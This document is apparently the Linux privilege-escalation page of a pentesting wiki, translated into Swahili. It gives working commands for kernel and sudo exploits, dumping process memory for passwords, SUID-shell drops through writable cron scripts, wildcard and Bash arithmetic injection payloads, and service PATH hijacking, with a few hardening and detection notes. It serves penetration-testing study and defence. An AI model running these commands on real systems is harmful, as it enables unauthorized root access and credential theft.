# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Mfumo wa Taarifa

### Taarifa za OS

Tuanze kupata maarifa fulani kuhusu OS inayoendesha
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Njia

Ikiwa **una ruhusa za kuandika kwenye folda yoyote ndani ya** `PATH` **variable** unaweza kuweza ku-hijack baadhi ya libraries au binaries:
```bash
echo $PATH
```
### Maelezo ya Env

Je, kuna taarifa za kuvutia, nenosiri au funguo za API kwenye mazingira variables?
```bash
(env || set) 2>/dev/null
```
### Exploits za kernel

Kagua toleo la kernel na kama kuna exploit yoyote inayoweza kutumika kuongeza privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Unaweza kupata orodha nzuri ya kernel zenye udhaifu na baadhi ya **compiled exploits** tayari hapa: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) na [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Tovuti nyingine ambako unaweza kupata baadhi ya **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Ili kutoa matoleo yote ya kernel yenye udhaifu kutoka kwenye wavuti hiyo unaweza kufanya:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Zana ambazo zinaweza kusaidia kutafuta kernel exploits ni:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (itekeleze KATIKA victim, huangalia tu exploits za kernel 2.x)

Daima **tafuta toleo la kernel katika Google**, huenda toleo lako la kernel limeandikwa kwenye kernel exploit fulani na hapo utakuwa na uhakika kwamba exploit hiyo ni sahihi.

Additional kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Toleo la Sudo

Kulingana na matoleo hatarishi ya sudo yanayoonekana katika:
```bash
searchsploit sudo
```
Unaweza kuangalia kama toleo la sudo lina udhaifu kwa kutumia grep hii.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Matoleo ya Sudo kabla ya 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) huruhusu watumiaji wa ndani wasio na privilijes kuinua privilijes zao hadi root kupitia chaguo la sudo `--chroot` wakati faili `/etc/nsswitch.conf` inapotumiwa kutoka kwenye saraka inayodhibitiwa na mtumiaji.

Hapa kuna [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) ya kutumia [udhaifu](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) huo. Kabla ya kuendesha exploit, hakikisha kwamba toleo lako la `sudo` lina udhaifu na kwamba linaunga mkono kipengele cha `chroot`.

Kwa taarifa zaidi, rejea [ushauri wa asili wa udhaifu](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

### Sudo host-based rules bypass (CVE-2025-32462)

Sudo kabla ya 1.9.17p1 (iliyotajwa kuwa imeathiriwa katika wigo: **1.8.8–1.9.17**) inaweza kutathmini host-based sudoers rules kwa kutumia **hostname iliyotolewa na mtumiaji** kutoka `sudo -h <host>` badala ya **hostname halisi**. Iwapo sudoers inatoa privilijes pana zaidi kwenye host nyingine, unaweza **kuigiza** hiyo host kienyeji.

Mahitaji:
- Toleo la sudo lenye udhaifu
- Host-specific sudoers rules (host si hostname ya sasa wala `ALL`)

Mfano wa sudoers pattern:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Exploit kwa kuigiza host iliyoruhusiwa:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Ikiwa utatuzi wa jina lililoghushiwa unazuiwa, liongeze kwenye `/etc/hosts` au tumia hostname ambayo tayari inaonekana kwenye logs/configs ili kuepuka DNS lookups.

#### sudo < v1.8.28

Kutoka kwa @sickrov
```
sudo -u#-1 /bin/bash
```
### Uthibitishaji wa saini ya Dmesg umeshindwa

Angalia **smasher2 box of HTB** kwa **mfano** wa jinsi vuln hii inaweza kutumiwa vibaya
```bash
dmesg 2>/dev/null | grep "signature"
```
### Uchanganuzi zaidi wa mfumo
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Orodhesha ulinzi unaowezekana

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Ikiwa uko ndani ya container, anza na sehemu ifuatayo ya container-security kisha pivot kwenda kwenye kurasa za matumizi mabaya mahususi za runtime:


{{#ref}}
container-security/
{{#endref}}

## Drives

Kagua **nini ime-mountiwa na ku-unmountiwa**, wapi na kwa nini. Ikiwa kuna kitu chochote ambacho kime-unmountiwa unaweza kujaribu kuki-mount na kukagua kwa private info
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Programu muhimu

Orodhesha binary muhimu
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Pia, angalia kama **kuna compiler yoyote iliyosakinishwa**. Hii ni muhimu ikiwa unahitaji kutumia kernel exploit fulani kwa sababu inapendekezwa kuikompaili kwenye mashine utakayotumia (au iliyo sawa nayo)
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Programu Dhaifu Zilizowekwa

Angalia **toleo la vifurushi na huduma vilivyowekwa**. Huenda kuna toleo la zamani la Nagios (kwa mfano) ambalo linaweza kutumiwa kuongezea ruhusa…\
Inapendekezwa kuangalia kwa mikono toleo la programu iliyowekwa inayotia shaka zaidi.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Kama una SSH access kwa machine unaweza pia kutumia **openVAS** kuangalia software iliyopitwa na wakati na yenye vulnerability iliyosakinishwa ndani ya machine.

> [!NOTE] > _Kumbuka kwamba commands hizi zitaonyesha taarifa nyingi ambazo kwa sehemu kubwa zitakuwa zisizo na manufaa, kwa hiyo inapendekezwa kutumia baadhi ya applications kama OpenVAS au zinazofanana ambazo zitaangalia kama toleo lolote la installed software lina vulnerability kwa known exploits_

## Processes

Angalia **processes gani** zinaendeshwa na kagua kama kuna process yoyote yenye **privileges zaidi kuliko inavyopaswa** (labda tomcat inayotekelezwa na root?)
```bash
ps aux
ps -ef
top -n 1
```
Daima angalia kama kuna [**electron/cef/chromium debuggers** zinazoendesha, unaweza kuzitumia vibaya ili kuongeza ruhusa](electron-cef-chromium-debugger-abuse.md). **Linpeas** huzitambua kwa kuangalia parameta ya `--inspect` ndani ya command line ya process.\
Pia **angalia ruhusa zako juu ya binaries za processes**, huenda ukaweza ku-overwrite ya mtu mwingine.

### Cross-user parent-child chains

Child process inayoendeshwa chini ya **user tofauti** na parent wake si lazima iwe na nia mbaya, lakini ni **triage signal** muhimu. Baadhi ya mabadiliko yanatarajiwa (`root` kuzindua service user, login managers kuunda session processes), lakini chains zisizo za kawaida zinaweza kufichua wrappers, debug helpers, persistence, au weak runtime trust boundaries.

Quick review:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Ikiwa utapata chain ya kushangaza, kagua command line ya parent na faili zote zinazoathiri behavior yake (`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments). Katika njia kadhaa za kweli za privesc, child yenyewe haikuwa writable, lakini **parent-controlled config** au helper chain ilikuwa.

### Deleted executables and deleted-open files

Runtime artifacts mara nyingi bado zinaweza kufikiwa **baada ya kufutwa**. Hii ni muhimu kwa privilege escalation na pia kwa kurejesha evidence kutoka kwa process ambayo tayari ina sensitive files wazi.

Kagua deleted executables:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Ikiwa `/proc/<PID>/exe` inaelekeza kwenye `(deleted)`, mchakato bado unaendesha picha ya binary ya zamani kutoka kwenye kumbukumbu. Hiyo ni ishara kali ya kuchunguza kwa sababu:

- executable iliyofutwa inaweza kuwa na strings au credentials za kuvutia
- mchakato unaoendelea unaweza bado kufichua file descriptors zenye manufaa
- binary yenye privilege iliyofutwa inaweza kuonyesha tampering ya karibuni au jaribio la kusafisha

Kusanya deleted-open files kwa ujumla:
```bash
lsof +L1
```
Ukipata descriptor ya kuvutia, isaidie moja kwa moja:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Hii ni muhimu sana hasa wakati mchakato bado una secret, script, database export, au flag file iliyofutwa ikiwa wazi.

### Process monitoring

Unaweza kutumia tools kama [**pspy**](https://github.com/DominicBreuker/pspy) kufuatilia processes. Hii inaweza kuwa ya manufaa sana kutambua vulnerable processes zinazotekelezwa mara kwa mara au wakati seti ya requirements imetimizwa.

### Process memory

Baadhi ya services za server huhifadhi **credentials kwa clear text ndani ya memory**.\
Kawaida utahitaji **root privileges** kusoma memory ya processes zinazomilikiwa na users wengine, hivyo hii huwa muhimu zaidi ukiwa tayari root na unataka kugundua more credentials.\
Hata hivyo, kumbuka kuwa **kama regular user unaweza kusoma memory ya processes unazomiliki**.

> [!WARNING]
> Kumbuka kwamba siku hizi machines nyingi **haziruhusu ptrace kwa default** ambayo inamaanisha kuwa huwezi dump processes nyingine zinazomilikiwa na unprivileged user wako.
>
> File _**/proc/sys/kernel/yama/ptrace_scope**_ inadhibiti accessibility ya ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: processes zote zinaweza kudebugiwa, mradi zina same uid. Hii ndiyo njia ya classical ya jinsi ptracing ilivyofanya kazi.
> - **kernel.yama.ptrace_scope = 1**: ni parent process tu inayoweza kudebugiwa.
> - **kernel.yama.ptrace_scope = 2**: ni admin tu anayeweza kutumia ptrace, kwa sababu ilihitaji CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: hakuna processes zinazoruhusiwa kufuatiliwa kwa ptrace. Mara baada ya kuwekwa, reboot inahitajika ili kuwezesha ptracing tena.

#### GDB

Ikiwa una access kwa memory ya FTP service (kwa mfano) unaweza kupata Heap na kutafuta ndani yake credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Skripti ya GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Kwa process ID fulani, **maps zinaonyesha jinsi memory ilivyopangwa ndani ya** virtual address space ya process hiyo; pia zinaonyesha **ruhusa za kila eneo lililopangwa**. Faili ya pseudo ya **mem** **inafichua memory ya process yenyewe**. Kutoka kwenye faili ya **maps** tunajua ni **maeneo gani ya memory yanaweza kusomwa** na offsets zake. Tunatumia taarifa hii **kuingia ndani ya faili ya mem na kudump maeneo yote yanayosomeka** kwenda kwenye faili.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` hutoa ufikiaji wa kumbukumbu ya mfumo ya **kimwili**, si kumbukumbu ya virtual. Nafasi ya anwani za virtual ya kernel inaweza kufikiwa kwa kutumia /dev/kmem.\
Kwa kawaida, `/dev/mem` inaweza kusomwa tu na **root** na kundi la **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump kwa linux

ProcDump ni uundaji upya wa Linux wa tool ya kawaida ya ProcDump kutoka suite ya tools za Sysinternals kwa Windows. Ipate katika [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

Ili kudump kumbukumbu ya process unaweza kutumia:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Unaweza kuondoa kwa mkono mahitaji ya root na kudump process inayomilikiwa na wewe
- Script A.5 kutoka [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root inahitajika)

### Credentials from Process Memory

#### Manual example

Kama utagundua kwamba authenticator process inaendeshwa:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Unaweza kutupa mchakato (angalia sehemu za awali ili kupata njia tofauti za kutupa kumbukumbu ya mchakato) na kutafuta credentials ndani ya kumbukumbu:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Zana [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) itafanya **kuiba clear text credentials kutoka memory** na kutoka baadhi ya **well known files**. Inahitaji root privileges ili ifanye kazi ipasavyo.

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Kazi zilizopangwa/Cron

### Crontab UI (alseambusher) inayoendeshwa kama root – privesc ya kipangaji cha wavuti

Ikiwa paneli ya wavuti ya “Crontab UI” (alseambusher/crontab-ui) inaendeshwa kama root na imefungwa tu kwa loopback, bado unaweza kuifikia kupitia SSH local port-forwarding na kuunda kazi yenye haki za juu ili kupata escalation.

Mlolongo wa kawaida
- Gundua port ya loopback-only (kwa mfano, 127.0.0.1:8000) na Basic-Auth realm kupitia `ss -ntlp` / `curl -v localhost:8000`
- Pata credentials katika operational artifacts:
- Backups/scripts zenye `zip -P <password>`
- systemd unit inayoonyesha `Environment="BASIC_AUTH_USER=..."`
, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel na login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Tengeneza job ya juu-priv na uikimbie mara moja (huacha SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Itumie:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Usiendeshe Crontab UI kama root; zuia kwa mtumiaji maalum na ruhusa chache kabisa
- Funga kwa localhost na pia zuia ufikiaji kupitia firewall/VPN; usitumie tena passwords zilezile
- Epuka kupachika secrets ndani ya unit files; tumia secret stores au root-only EnvironmentFile
- Wezesha audit/logging kwa executions za job zinazohitajika kwa wakati huo



Angalia kama scheduled job yoyote inaweza kuwa vulnerable. Huenda ukaweza kunufaika na script inayotekelezwa na root (wildcard vuln? unaweza kurekebisha files ambazo root hutumia? tumia symlinks? tengeneza files maalum ndani ya directory ambayo root hutumia?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Ikiwa `run-parts` inatumika, angalia ni majina gani yatakayotekelezwa kweli:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Hii huepuka false positives. Direktorii ya periodic inayoweza kuandikwa ni muhimu tu ikiwa jina la faili la payload yako linalingana na sheria za ndani za `run-parts`.

### Cron path

Kwa mfano, ndani ya _/etc/crontab_ unaweza kupata PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Angalia jinsi mtumiaji "user" ana ruhusa za kuandika juu ya /home/user_)

Ikiwa ndani ya crontab hii mtumiaji root anajaribu kutekeleza command au script fulani bila kuweka path. Kwa mfano: _\* \* \* \* root overwrite.sh_\
Basi, unaweza kupata root shell kwa kutumia:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Ikiwa script inatekelezwa na root na ina “**\***” ndani ya command, unaweza kuitumia kufanya mambo yasiyotegemewa (kama privesc). Mfano:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ikiwa wildcard imeongozwa na path kama** _**/some/path/\***_ **, haiko vulnerable (hata** _**./\***_ **siyo).**

Soma ukurasa ufuatao kwa tricks zaidi za wildcard exploitation:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash hufanya parameter expansion na command substitution kabla ya arithmetic evaluation katika ((...)), $((...)) na let. Ikiwa root cron/parser inasoma log fields zisizoaminika na kuziingiza kwenye arithmetic context, attacker anaweza kuingiza command substitution $(...) ambayo hutekelezwa kama root wakati cron inapoendeshwa.

- Kwa nini inafanya kazi: Katika Bash, expansions hutokea kwa mpangilio huu: parameter/variable expansion, command substitution, arithmetic expansion, kisha word splitting na pathname expansion. Kwa hiyo value kama `$(/bin/bash -c 'id > /tmp/pwn')0` kwanza hubadilishwa (ikitekeleza command), kisha numeric `0` iliyobaki hutumiwa kwa arithmetic ili script iendelee bila errors.

- Mfano wa kawaida wenye udhaifu:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Pata text inayodhibitiwa na attacker iandikwe kwenye log inayoparswa ili field inayoonekana ya namba iwe na command substitution na iishe kwa digit. Hakikisha command yako haitoi kitu kwenye stdout (au iredirect) ili arithmetic ibaki sahihi.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Ikiwa **unaweza kurekebisha cron script** inayotekelezwa na root, unaweza kupata shell kwa urahisi:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ikiwa script iliyotekelezwa na root inatumia **directory ambayo una full access kwake**, huenda ikawa na manufaa kufuta folder hilo na **kuunda symlink folder kwenda lingine** linalohudumia script inayodhibitiwa na wewe
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Uthibitishaji wa Symlink na ushughulikiaji salama wa faili

Wakati wa kukagua privileged scripts/binaries zinazosomea au kuandikia faili kwa path, hakiki jinsi links zinavyoshughulikiwa:

- `stat()` hufuata symlink na kurudisha metadata ya target.
- `lstat()` hurudisha metadata ya link yenyewe.
- `readlink -f` na `namei -l` husaidia kutatua final target na kuonyesha permissions za kila path component.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Kwa watetezi/watengenezaji, mifumo salama zaidi dhidi ya hila za symlink ni pamoja na:

- `O_EXCL` na `O_CREAT`: shindwa ikiwa njia tayari ipo (huzuia attacker kuweka mapema links/files).
- `openat()`: fanya kazi ukitumia file descriptor ya directory inayoaminika kama msingi.
- `mkstemp()`: tengeneza temporary files kwa njia ya atomiki na permissions salama.

### Custom-signed cron binaries with writable payloads
Blue teams wakati mwingine "hu-sign" binaries zinazoendeshwa na cron kwa kudondosha custom ELF section na kufanya grep ya vendor string kabla ya kuzitekeleza kama root. Ikiwa binary hiyo ni group-writable (kwa mfano, `/opt/AV/periodic-checks/monitor` inayomilikiwa na `root:devs 770`) na unaweza leak signing material, unaweza kughushi section hiyo na kuchukua cron task:

1. Tumia `pspy` kunasa verification flow. Katika Era, root aliendesha `objcopy --dump-section .text_sig=text_sig_section.bin monitor` ikifuatiwa na `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` kisha akaendesha faili.
2. Tengeneza upya certificate inayotarajiwa kwa kutumia leaked key/config (kutoka `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Tengeneza malicious replacement (kwa mfano, dondosha SUID bash, ongeza SSH key yako) na embed certificate ndani ya `.text_sig` ili grep ipite:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Andika binary iliyopangwa upya huku ukihifadhi execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Subiri cron run inayofuata; mara tu naive signature check inapofaulu, payload yako huendeshwa kama root.

### Frequent cron jobs

Unaweza kufuatilia processes ili kutafuta processes zinazotekelezwa kila dakika 1, 2 au 5. Huenda ukaweza kuitumia na kuongeza privileges.

Kwa mfano, ili **kufuatilia kila 0.1s kwa dakika 1**, **kupanga kwa commands zinazotekelezwa mara chache zaidi** na kufuta commands ambazo zimetekelezwa mara nyingi zaidi, unaweza kufanya:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Unaweza pia kutumia** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (hii itafuatilia na kuorodhesha kila mchakato unaoanza).

### Mibackup ya root inayohifadhi mode bits zilizowekwa na mshambuliaji (pg_basebackup)

Ikiwa cron inayomilikiwa na root inatumia `pg_basebackup` (au copy yoyote ya kujirudia) dhidi ya directory ya database ambayo unaweza kuandika ndani yake, unaweza kupanda **SUID/SGID binary** ambayo itanakiliwa tena kama **root:root** na mode bits zilezile ndani ya output ya backup.

Mtiririko wa kawaida wa ugunduzi (kama DB user wa chini wa ruhusa):
- Tumia `pspy` kuona root cron ikiita kitu kama `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` kila dakika.
- Hakikisha source cluster (kwa mfano, `/var/lib/postgresql/14/main`) inaweza kuandikwa na wewe na destination (`/opt/backups/current`) inakuwa owned by root baada ya job.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Hii hufanya kazi kwa sababu `pg_basebackup` huhifadhi file mode bits wakati wa kunakili cluster; inapotekelezwa na root, files za destination hurithi **root ownership + attacker-chosen SUID/SGID**. Kila privileged backup/copy routine inayofanana ambayo huhifadhi permissions na kuandika ndani ya executable location inaweza kuathiriwa.

### Invisible cron jobs

Inawezekana kuunda cronjob **kwa kuweka carriage return baada ya comment** (bila newline character), na cron job itafanya kazi. Mfano (zingatia carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Ili kugundua aina hii ya kuingia kwa siri, kagua faili za cron kwa kutumia zana zinazoonyesha control characters:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Services

### Writable _.service_ files

Angalia kama unaweza kuandika faili yoyote ya `.service`, ikiwa unaweza, **unaweza kuibadilisha** ili **itekeleze** **backdoor** yako **wakati** service **inaanza**, **inaanzishwa upya** au **inasitishwa** (huenda ukahitaji kusubiri hadi mashine ianze upya).\
Kwa mfano tengeneza backdoor yako ndani ya faili ya .service kwa **`ExecStart=/tmp/script.sh`**

### Writable service binaries

Kumbuka kwamba ikiwa una **ruhusa za kuandika juu ya binaries zinazotekelezwa na services**, unaweza kuzibadilisha kuwa backdoors ili services zinapotekelezwa tena backdoors pia zitekelezwe.

### systemd PATH - Relative Paths

Unaweza kuona PATH inayotumiwa na **systemd** kwa:
```bash
systemctl show-environment
```
Ikiwa unaona kwamba unaweza **kuandika** katika mojawapo ya folda za njia hiyo unaweza huenda ukaweza **kuongeza ruhusa**. Unahitaji kutafuta **njia za jamaa zinazotumiwa kwenye faili za usanidi za huduma** kama:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Then, tengeneza **executable** yenye **jina lilelile kama binary ya relative path** ndani ya folda ya systemd PATH unayoweza kuandika, na wakati service itaombwa kutekeleza kitendo kilicho hatarishi (**Start**, **Stop**, **Reload**), **backdoor** yako itatekelezwa (watumiaji wasio na privileged kwa kawaida hawawezi kuanza/kusimamisha services lakini kagua kama unaweza kutumia `sudo -l`).

**Jifunze zaidi kuhusu services kwa kutumia `man systemd.service`.**

## **Timers**

**Timers** ni systemd unit files ambazo jina lake linaishia kwa `**.timer**` na hudhibiti `**.service**` files au matukio. **Timers** zinaweza kutumika kama mbadala wa cron kwa sababu zina support iliyojengewa ndani kwa calendar time events na monotonic time events na zinaweza kuendeshwa asynchronously.

Unaweza kuorodhesha timers zote kwa kutumia:
```bash
systemctl list-timers --all
```
### Vifaa vya muda vinavyoweza kuandikwa

